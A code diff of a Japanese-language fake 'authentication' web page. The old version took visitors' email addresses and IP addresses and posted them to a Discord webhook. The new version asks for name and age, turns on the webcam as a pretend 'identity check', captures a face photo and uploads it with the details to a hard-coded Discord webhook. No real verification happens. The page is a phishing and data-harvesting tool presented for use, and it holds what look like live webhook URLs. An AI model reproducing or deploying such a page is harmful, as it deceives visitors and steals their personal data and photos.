@@ -8,186 +8,245 @@
         body {
             margin: 0;
             padding: 0;
-            font-family: 'Arial', sans-serif;
-            background-color: #121212;
-            color: #ffffff;
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #000;
+            color: #0f0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             overflow: hidden;
         }
-        .container, .success-screen {
-            background-color: #1e1e1e;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        .container {
+            background-color: #0a0a0a;
+            border: 2px solid #0f0;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 0 25px rgba(0, 255, 0, 0.5),
+                        inset 0 0 15px rgba(0, 255, 0, 0.1);
             text-align: center;
             width: 90%;
-            max-width: 400px;
+            max-width: 450px;
+            min-height: 400px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
         }
         h1 {
             margin-top: 0;
-            font-size: 24px;
-        }
-        .glitch {
-            color: #00ff00;
-            font-size: 32px;
-            font-weight: bold;
+            font-size: 28px;
             text-transform: uppercase;
-            text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00;
-            animation: glitch 725ms infinite;
+            letter-spacing: 3px;
+            animation: flicker 1.5s infinite alternate;
         }
-        @keyframes glitch {
-            0%   { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00; }
-            15%  { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00; }
-            16%  { text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff, -0.05em -0.05em 0 #fffc00; }
-            49%  { text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff, -0.05em -0.05em 0 #fffc00; }
-            50%  { text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff, 0 -0.04em 0 #fffc00; }
-            99%  { text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff, 0 -0.04em 0 #fffc00; }
-            100% { text-shadow: -0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00; }
+        p {
+            font-size: 14px;
+            line-height: 1.6;
         }
-        input[type="email"] {
-            width: calc(100% - 20px);
-            padding: 12px;
-            margin: 20px 0;
-            border: 1px solid #333;
-            background-color: #2a2a2a;
-            color: #ffffff;
-            border-radius: 6px;
-            font-size: 16px;
+        input[type="text"], input[type="number"] {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #0f0;
+            background-color: #111;
+            color: #0f0;
+            border-radius: 3px;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        input[type="text"]:focus, input[type="number"]:focus {
+            outline: none;
+            box-shadow: 0 0 10px #0f0;
         }
         button {
             width: 100%;
             padding: 12px;
-            background-color: #00ff00;
-            color: #121212;
-            border: none;
-            border-radius: 6px;
+            margin-top: 20px;
+            background-color: transparent;
+            color: #0f0;
+            border: 1px solid #0f0;
+            border-radius: 3px;
             cursor: pointer;
             font-weight: bold;
-            font-size: 16px;
-            transition: background-color 0.3s;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+            font-family: 'Courier New', Courier, monospace;
         }
         button:hover {
-            background-color: #00cc00;
+            background-color: #0f0;
+            color: #000;
+            box-shadow: 0 0 15px #0f0;
         }
         button:disabled {
-            background-color: #555;
+            opacity: 0.5;
             cursor: not-allowed;
         }
-        .success-screen {
+        .hidden {
             display: none;
         }
-        .success-screen h1 {
-            color: #00ff00;
-            font-size: 36px;
-            margin: 0 0 20px;
+        video, canvas {
+            width: 100%;
+            max-width: 320px;
+            height: auto;
+            border: 1px solid #0f0;
+            margin-top: 20px;
+            border-radius: 3px;
         }
-        .error-msg {
-            color: #ff4444;
-            margin-top: 10px;
+        #status {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #0f0;
             min-height: 20px;
+        }
+        @keyframes flicker {
+            0%, 18%, 22%, 25%, 53%, 57%, 100% {
+                text-shadow: 0 0 5px #0f0, 0 0 10px #0f0;
+            }
+            20%, 24%, 55% {
+                text-shadow: none;
+            }
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <!-- ステップ1: 名前と年齢 -->
+        <div id="step1">
+            <h1>認証</h1>
+            <p>アクセスを続行するには、情報を入力してください。</p>
+            <form id="infoForm">
+                <input type="text" id="name" placeholder="名前" required>
+                <input type="number" id="age" placeholder="年齢" min="1" max="120" required>
+                <button type="submit">次へ</button>
+            </form>
+        </div>
 
-    <!-- 入力画面 -->
-    <div class="container" id="authScreen">
-        <h1 class="glitch">認証</h1>
-        <p>アクセスを続行するには、メールアドレスを入力してください。</p>
-        <form id="authForm">
-            <input type="email" id="email" placeholder="メールアドレス" required autocomplete="email">
-            <button type="submit" id="submitBtn">認証する</button>
-            <div class="error-msg" id="errorMsg"></div>
-        </form>
-    </div>
-
-    <!-- 成功画面（隠しておく） -->
-    <div class="success-screen" id="successScreen">
-        <h1>認証されました</h1>
-        <p>これでアクセスが可能になりました！</p>
-        <p style="margin-top:30px; font-size:14px; color:#aaa;">
-            しばらくすると自動で次のページに移動します...<br>
-            （またはここをクリック → <a href="#" style="color:#00ff00;">進む</a>）
-        </p>
+        <!-- ステップ2: カメラ撮影 -->
+        <div id="step2" class="hidden">
+            <h1>本人確認</h1>
+            <p>顔がしっかり映るようにしてください。</p>
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas" class="hidden"></canvas>
+            <button id="captureBtn">撮影して送信</button>
+            <div id="status">準備完了...</div>
+        </div>
     </div>
 
     <script>
-        // IP取得
-        let userIP = "取得中...";
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const infoForm = document.getElementById('infoForm');
+        const nameInput = document.getElementById('name');
+        const ageInput = document.getElementById('age');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureBtn = document.getElementById('captureBtn');
+        const statusDiv = document.getElementById('status');
 
-        window.onload = async function() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                userIP = data.ip;
-            } catch (err) {
-                console.error("IP取得失敗", err);
-                userIP = "取得できませんでした";
-            }
-        };
+        let stream = null;
+        let userData = {};
 
-        // フォーム送信
-        document.getElementById('authForm').addEventListener('submit', async function(e) {
+        // ステップ1 → ステップ2
+        infoForm.addEventListener('submit', (e) => {
             e.preventDefault();
-            
-            const email = document.getElementById('email').value.trim();
-            const submitBtn = document.getElementById('submitBtn');
-            const errorMsg = document.getElementById('errorMsg');
+            userData.name = nameInput.value.trim() || "不明";
+            userData.age  = ageInput.value || "不明";
 
-            if (!email) {
-                errorMsg.textContent = "メールアドレスを入力してください";
+            step1.classList.add('hidden');
+            step2.classList.remove('hidden');
+            startCamera();
+        });
+
+        // カメラ起動
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' },
+                    audio: false
+                });
+                video.srcObject = stream;
+                statusDiv.textContent = 'カメラ起動済み。顔を映して「撮影して送信」を押してください。';
+            } catch (err) {
+                console.error('カメラエラー:', err);
+                statusDiv.textContent = 'カメラ起動失敗。権限を確認してください。';
+                statusDiv.style.color = '#f00';
+                captureBtn.disabled = true;
+            }
+        }
+
+        // 撮影＆送信
+        captureBtn.addEventListener('click', async () => {
+            if (!stream) {
+                statusDiv.textContent = 'カメラが準備できていません。';
+                statusDiv.style.color = '#f00';
                 return;
             }
 
-            // 送信中はボタン無効化
-            submitBtn.disabled = true;
-            submitBtn.textContent = "認証中...";
-            errorMsg.textContent = "";
+            captureBtn.disabled = true;
+            statusDiv.textContent = '撮影中...';
+            statusDiv.style.color = '#ff0';
+
+            // canvasに描画
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Blob取得（圧縮して軽く）
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.82));
+
+            // カメラ停止
+            stream.getTracks().forEach(t => t.stop());
+            stream = null;
+
+            statusDiv.textContent = '送信中...（数秒かかる場合があります）';
+            statusDiv.style.color = '#ff0';
+
+            // FormData作成
+            const formData = new FormData();
+
+            // JSON部分
+            const payload = {
+                content: `**本人確認ログ**\n名前: ${userData.name}\n年齢: ${userData.age}`,
+                embeds: [{
+                    title: "本人確認画像",
+                    color: 0x00ff00,
+                    fields: [
+                        { name: "名前", value: userData.name, inline: true },
+                        { name: "年齢", value: userData.age, inline: true },
+                        { name: "撮影日時", value: new Date().toLocaleString('ja-JP'), inline: true }
+                    ],
+                    image: { url: "attachment://photo.jpg" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            formData.append('payload_json', JSON.stringify(payload));
+            formData.append('files[0]', blob, 'photo.jpg');
+
+            // Webhook URL（ここを必ず変更！）
+            const webhookUrl = "https://discord.com/api/webhooks/1468964638237397179/NMYIXppBkg9vkl02D5OLB_sOuXSdDLkiY9V30yWWXNaEBQm0L3LS6bEGquFAFZ0ue69d";
 
             try {
-                const webhookUrl = "https://discord.com/api/webhooks/1468960055163621584/tJKhKF6YwABWOWY3v01-gc0IlsuaIPRrOkyGurBDOUd32_hu4w2u0qV9GYM8uJmDNk5";
-
-                const payload = {
-                    content: "**新しい認証情報**",
-                    embeds: [{
-                        title: "認証ログ",
-                        color: 0x00ff00,
-                        fields: [
-                            { name: "IP", value: userIP, inline: true },
-                            { name: "メールアドレス", value: email, inline: true },
-                            { name: "時刻", value: new Date().toLocaleString('ja-JP'), inline: true }
-                        ],
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-
-                const response = await fetch(webhookUrl, {
+                const res = await fetch(webhookUrl, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: formData
                 });
 
-                if (!response.ok) {
-                    throw new Error(`Webhookエラー: ${response.status}`);
+                if (res.ok) {
+                    statusDiv.textContent = '送信成功！認証が完了しました。';
+                    statusDiv.style.color = '#0f0';
+                    video.style.display = 'none';
+                    captureBtn.style.display = 'none';
+                    canvas.classList.remove('hidden'); // 撮った写真を表示
+                } else {
+                    const err = await res.text().catch(() => '不明');
+                    throw new Error(`HTTP ${res.status} - ${err}`);
                 }
-
-                // 成功 → 画面切り替え
-                document.getElementById('authScreen').style.display = 'none';
-                document.getElementById('successScreen').style.display = 'flex';
-                document.getElementById('successScreen').style.flexDirection = 'column';
-                document.getElementById('successScreen').style.alignItems = 'center';
-
-                // 例: 5秒後に自動でどこかに飛ばしたい場合
-                // setTimeout(() => { window.location.href = "https://your-next-page.com"; }, 5000);
-
-            } catch (error) {
-                console.error("送信失敗", error);
-                errorMsg.textContent = "送信に失敗しました。もう一度お試しください。";
-                submitBtn.disabled = false;
-                submitBtn.textContent = "認証する";
+            } catch (err) {
+                console.error('送信エラー:', err);
+                statusDiv.textContent = '送信失敗しました。Webhook URLを確認してください。';
+                statusDiv.style.color = '#f00';
+                captureBtn.disabled = false;
             }
         });
     </script>
